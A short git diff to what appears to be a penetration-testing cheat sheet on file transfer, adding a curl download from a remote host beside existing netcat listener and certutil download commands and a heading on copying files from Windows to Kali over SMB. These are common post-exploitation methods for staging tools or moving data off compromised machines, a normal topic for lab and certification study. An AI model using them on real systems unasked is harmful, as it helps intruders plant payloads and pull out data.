@@ -182,6 +182,11 @@ nc -lp 8888 > outfile
 certutil.exe -urlcache -split -f "$RHOST" outfile.zip
 ```
 
+### curl
+```
+curl $RHOST -o outfile
+```
+
 ### From Windows to local Kali machine using impacket-smbserver
 On local Kali machine:
 ```
